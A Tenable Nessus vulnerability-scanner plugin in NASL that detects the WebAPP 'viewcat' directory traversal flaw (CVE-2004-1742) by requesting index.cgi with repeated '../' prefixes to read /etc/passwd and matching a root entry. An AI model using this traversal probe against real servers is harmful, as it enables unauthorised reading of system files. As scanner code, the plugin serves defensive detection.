#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(14365);
 script_version("$Revision: 1.15 $");

 script_cve_id("CVE-2004-1742");
 script_bugtraq_id(11028);
 script_osvdb_id(9164);
 
 name["english"] = "WebAPP Directory Traversal";
 script_name(english:name["english"]);
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that is susceptible to
directory traversal attacks." );
 script_set_attribute(attribute:"description", value:
"There is a flaw in the remote version of WebApp fails to filter
directory traversal sequences from the 'viewcat' parameter of the
'index.cgi' script.  An unauthenticated attacker can leverage this
issue to read arbitrary files on the remote host with the privileges
of the web server process." );
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=bugtraq&m=109336268002879&w=2" );
 script_set_attribute(attribute:"see_also", value:"http://cornerstone.web-app.org/cgi-bin/index.cgi?action=downloads&cat=updates" );
 script_set_attribute(attribute:"solution", value:
"Apply the fix provided by the vendor." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2004/08/24");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/08/24");
 script_cvs_date("$Date: 2011/03/14 21:48:15 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
 summary["english"] = "Checks for a directory traversal bug in WebAPP";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2004-2011 Tenable Network Security, Inc.");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("webapp_detect.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);


# Test an install.
install = get_kb_item(string("www/", port, "/webapp"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit the vulnerability.
  i = 0;
  file = "etc/passwd";
  # nb: the exact installation directory can vary so we iterate a few 
  #     times, prepending "../" to the filename each time.
  while (++i < 10) {
    file = string("../", file);
    w = http_send_recv3(method:"GET", 
      item:string(
        dir, "/index.cgi?",
        "action=topics&",
        "viewcat=", file
      ),
      port:port
    );
    if (isnull(w)) exit(0);
    r = w[2];
    if( egrep(pattern:"root:.*:0:[01]:", string:r) ) {
      security_warning(port);
      exit(0);
    }
  }
}
